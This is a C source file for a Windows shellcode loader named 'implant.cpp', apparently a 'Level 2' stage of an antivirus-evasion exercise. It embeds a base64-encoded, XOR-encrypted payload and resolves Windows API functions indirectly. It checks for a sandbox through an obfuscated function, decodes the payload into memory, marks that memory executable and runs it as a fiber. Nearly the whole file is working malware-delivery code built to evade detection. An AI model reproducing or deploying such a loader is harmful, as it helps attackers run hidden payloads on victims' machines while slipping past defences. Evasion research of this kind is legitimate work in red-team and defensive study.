/// Compile With:
/// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\levelX.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#pragma comment (lib, "Crypt32.lib")

/// User defined headers
#include "sandbox.h"

// Payload String - Level 2
unsigned char payload[] = {
0x6e, 0x53, 0x72, 0x67, 0x67, 0x4a, 0x57, 0x4f, 0x70, 0x32, 0x68, 0x70, 0x61,
0x69, 0x6f, 0x39, 0x4c, 0x44, 0x34, 0x39, 0x49, 0x53, 0x63, 0x36, 0x51, 0x71,
0x59, 0x51, 0x50, 0x76, 0x77, 0x71, 0x47, 0x54, 0x4c, 0x71, 0x4d, 0x48, 0x73,
0x73, 0x37, 0x6a, 0x52, 0x48, 0x49, 0x4f, 0x49, 0x59, 0x4f, 0x79, 0x52, 0x69,
0x32, 0x53, 0x55, 0x36, 0x50, 0x45, 0x4f, 0x36, 0x50, 0x45, 0x53, 0x32, 0x32,
0x30, 0x51, 0x59, 0x42, 0x6d, 0x4e, 0x4f, 0x51, 0x79, 0x57, 0x6b, 0x72, 0x32,
0x6f, 0x70, 0x61, 0x4b, 0x75, 0x4a, 0x67, 0x54, 0x38, 0x76, 0x50, 0x6a, 0x6a,
0x36, 0x49, 0x46, 0x50, 0x2f, 0x4e, 0x30, 0x6f, 0x2f, 0x65, 0x61, 0x6e, 0x78,
0x34, 0x65, 0x70, 0x6a, 0x5a, 0x47, 0x55, 0x75, 0x34, 0x71, 0x67, 0x64, 0x44,
0x53, 0x4e, 0x74, 0x76, 0x54, 0x37, 0x6b, 0x4f, 0x47, 0x6b, 0x32, 0x2b, 0x44,
0x52, 0x56, 0x50, 0x33, 0x61, 0x6f, 0x6d, 0x69, 0x77, 0x70, 0x6e, 0x61, 0x6f,
0x6c, 0x37, 0x6c, 0x4c, 0x76, 0x49, 0x47, 0x69, 0x38, 0x4a, 0x6c, 0x32, 0x6b,
0x4a, 0x6c, 0x36, 0x77, 0x33, 0x54, 0x4f, 0x79, 0x76, 0x58, 0x67, 0x33, 0x64,
0x72, 0x6c, 0x42, 0x6d, 0x68, 0x53, 0x54, 0x4c, 0x32, 0x63, 0x70, 0x51, 0x6d,
0x38, 0x74, 0x55, 0x4c, 0x73, 0x65, 0x74, 0x44, 0x55, 0x71, 0x35, 0x44, 0x42,
0x56, 0x4f, 0x33, 0x4b, 0x6b, 0x45, 0x7a, 0x66, 0x38, 0x64, 0x44, 0x45, 0x2b,
0x36, 0x69, 0x4a, 0x2f, 0x4c, 0x57, 0x53, 0x32, 0x4a, 0x75, 0x4e, 0x74, 0x34,
0x69, 0x4e, 0x74, 0x76, 0x53, 0x38, 0x33, 0x4d, 0x53, 0x6b, 0x73, 0x4b, 0x69,
0x34, 0x30, 0x4c, 0x6a, 0x59, 0x68, 0x4f, 0x43, 0x41, 0x70, 0x34, 0x59, 0x39,
0x45, 0x4a, 0x44, 0x53, 0x59, 0x69, 0x44, 0x45, 0x72, 0x4d, 0x6a, 0x59, 0x6c,
0x35, 0x58, 0x32, 0x5a, 0x4a, 0x6f, 0x32, 0x4d, 0x69, 0x79, 0x67, 0x2b, 0x7a,
0x58, 0x6c, 0x35, 0x65, 0x6d, 0x46, 0x69, 0x59, 0x32, 0x52, 0x6c, 0x4c, 0x75,
0x72, 0x6c, 0x61, 0x47, 0x74, 0x72, 0x62, 0x43, 0x7a, 0x55, 0x58, 0x76, 0x73,
0x65, 0x39, 0x59, 0x79, 0x68, 0x7a, 0x6f, 0x62, 0x43, 0x32, 0x69, 0x38, 0x37,
0x32, 0x38, 0x54, 0x32, 0x32, 0x66, 0x69, 0x5a, 0x73, 0x69, 0x44, 0x71, 0x72,
0x6b, 0x4e, 0x51, 0x61, 0x78, 0x4a, 0x6c, 0x38, 0x49, 0x71, 0x53, 0x42, 0x6e,
0x48, 0x4f, 0x4d, 0x57, 0x51, 0x4b, 0x46, 0x68, 0x42, 0x68, 0x4f, 0x79, 0x4c,
0x74, 0x76, 0x35, 0x6d, 0x79, 0x43, 0x77, 0x67, 0x47, 0x43, 0x45, 0x49, 0x49,
0x46, 0x67, 0x70, 0x77 };

// Length of payload array
unsigned int payload_len = (unsigned int)(sizeof(payload)/sizeof(payload[0]));
  
/// Main Function
///
/// Returns
///   0 - OK
///  -1 - VirtualAlloc() failed
///  -2 - VirtualProtect() failed
///  -3 - ConvertThreadToFiber() failed
///  -4 - CreateFiber() failed
///  -5 - Base64 decoding failed while trying to assess the length of the resulting string
///  -6 - Base64 decoding failed 
/// -98 - Failed to populate functions
/// -99 - Sandbox check failed
int main(void){
    BOOL rv;
    BOOL b64_return;
    DWORD _event = 0;
    void * exec_mem;
    DWORD oldprotect = 0;
    DWORD decoded_data_len;
    LPVOID th;
    LPVOID fiber; 
    
    // Populate functions
    if (__get_funcs() != 0){    
        // fprintf(stderr, "Failed to populate functions\n");
        return -98;
    }

    // Convert main Thread to fiber
    th = _ConvertThreadToFiber(NULL);
    if(th == NULL){
        // fprintf(stderr, "ConvertThreadToFiber failed!\n");
        return -3;
    }

    // Check for sandbox
    if (wUtMwCHxxt10() != 0) {
        // fprintf(stderr, "Sandbox Environment!\n");
        return -99;
    }

    b64_return = _CryptStringToBinaryA((LPCSTR) payload, payload_len, CRYPT_STRING_BASE64, NULL, &decoded_data_len, NULL, NULL);
    if (b64_return == NULL){
        // fprintf(stderr, "Base64 Decoding Failed with error: %d\n", GetLastError());
        return -5;
    }

    // Allocate a memory buffer for payload
    exec_mem = _VirtualAlloc(0, decoded_data_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL){
        // fprintf(stderr, "VirtualAlloc Failed with error code: %d\n", GetLastError());
        return -1;
    }

    // Decode the string
    b64_return = _CryptStringToBinaryA((LPCSTR) payload, payload_len, CRYPT_STRING_BASE64, (BYTE * )exec_mem, &decoded_data_len, NULL, NULL);
    if (b64_return == NULL){
        // fprintf(stderr, "Base64 Decoding Failed with error: %d\n", GetLastError());
        return -6;
    }

    // XOR Payload
    LCzOatFaVf71((unsigned char*)exec_mem, decoded_data_len, XOR_KEY, xor_key_len);

    // Make new buffer as executable
    rv = _VirtualProtect(exec_mem, decoded_data_len, PAGE_EXECUTE_READ, &oldprotect);
    if ( rv == 0 ) {
        // fprintf(stderr, "VirtualProtect Failed with error code: %d\n", GetLastError());
        return -2;
    }
    
    fiber = _CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
    if (fiber == NULL){
        // fprintf(stderr, "CreateFiber Failed with error code: %d\n", GetLastError());
        return -4;
    }

    _SwitchToFiber(fiber);

    return 0;
}